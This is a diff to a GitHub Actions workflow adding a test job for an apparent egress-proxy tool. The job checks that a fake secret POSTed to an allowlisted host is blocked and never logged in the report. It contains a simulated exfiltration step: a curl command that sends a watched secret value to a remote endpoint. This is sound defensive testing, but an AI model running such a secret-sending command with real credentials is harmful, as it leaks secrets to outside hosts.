@@ -105,6 +105,83 @@ jobs:
           fi
           echo "OK: traffic blocked but the job continued (blocked=$BLOCKED)"
 
+  # 4. Exfiltration detection, end to end on a real runner: a fake secret
+  #    POSTed to a host the policy explicitly ALLOWS must be blocked for its
+  #    payload, and the secret value must appear nowhere in the report
+  #    artifact. This is the case destination-based enforcement cannot see —
+  #    and the leak-freedom grep is the safety property that makes the
+  #    feature shippable at all.
+  exfil-blocks:
+    name: "Exfil: secret to an allowlisted host is blocked, never logged"
+    runs-on: ubuntu-latest
+    env:
+      # A fake, public, deliberately recognisable value. Long enough to pass
+      # the 12-char minimum; watched by the demo policy's watch_env.
+      PW_DEMO_FAKE_SECRET: "pwdemo-fake-secret-value-1234567890"
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - name: "PipeWarden setup (enforce + exfiltration block)"
+        uses: ./native-proxy/action-setup
+        with:
+          policy-file: .github/pipewarden/demo-pipewarden-exfil.network-policy.yml
+          mode: enforce
+          transparent: 'false'   # env-var proxy: only the explicit curls are policed
+          dns: 'false'
+      - name: "Control: clean POST to the allowlisted host passes"
+        run: |
+          # -f would fail on GitHub's 404 for this endpoint; the point is only
+          # that the proxy did not 403 it. Capture the status to assert that.
+          code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 \
+            -X POST -d '{"data":"nothing sensitive here"}' \
+            https://api.github.com/demo-clean || echo 000)
+          echo "clean POST -> HTTP ${code}"
+          if [ "${code}" = "403" ]; then
+            echo "::error::clean request was blocked — false positive"; exit 1
+          fi
+      - name: "Attack: POST the watched secret to the same allowlisted host"
+        run: |
+          code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 \
+            -X POST -d "{\"data\":\"${PW_DEMO_FAKE_SECRET}\"}" \
+            https://api.github.com/demo-exfil || echo 000)
+          echo "exfil POST -> HTTP ${code}"
+          if [ "${code}" != "403" ]; then
+            echo "::error::secret-carrying request was NOT blocked (got ${code})"; exit 1
+          fi
+      - name: "PipeWarden teardown (expected to fail on the block)"
+        id: teardown
+        continue-on-error: true
+        uses: ./native-proxy/action-teardown
+      - name: "Assert blocked, reported, and never logged"
+        env:
+          OUTCOME: ${{ steps.teardown.outcome }}
+          BLOCKED: ${{ steps.teardown.outputs.blocked-count }}
+          REPORT_DIR: ${{ steps.teardown.outputs.report-path }}
+        run: |
+          echo "teardown outcome=$OUTCOME blocked-count=$BLOCKED"
+          if [ "$OUTCOME" != "failure" ]; then
+            echo "::error::exfil block did not fail the job"; exit 1
+          fi
+          if [ -z "$BLOCKED" ] || [ "$BLOCKED" -lt 1 ]; then
+            echo "::error::expected blocked-count >= 1, got '$BLOCKED'"; exit 1
+          fi
+          # The finding must be attributed to the watched variable...
+          if ! grep -q "PW_DEMO_FAKE_SECRET" "${REPORT_DIR}/report.json"; then
+            echo "::error::report carries no finding labelled PW_DEMO_FAKE_SECRET"; exit 1
+          fi
+          # ...and the value must appear NOWHERE in the artifact, in any
+          # encoding the scanner itself knows about. This grep is the property
+          # that makes the feature safe to ship: an artifact that contained
+          # the value would publish the credential more conveniently than the
+          # exfiltration attempt did.
+          b64=$(printf '%s' "$PW_DEMO_FAKE_SECRET" | base64 | tr -d '=')
+          hex=$(printf '%s' "$PW_DEMO_FAKE_SECRET" | xxd -p | tr -d '\n')
+          for needle in "$PW_DEMO_FAKE_SECRET" "$b64" "$hex"; do
+            if grep -rqF "$needle" "${REPORT_DIR}"; then
+              echo "::error::the secret value (or an encoding of it) is present in the report artifact"; exit 1
+            fi
+          done
+          echo "OK: blocked at an allowlisted destination, labelled in the report, value absent from the artifact"
+
   # 3. Single-step action, enforce, no violation: the job must pass (no false
   #    positive). The single-step FAIL-on-block path can't be asserted from a
   #    green workflow — a post-step failure fails the job, and job-level
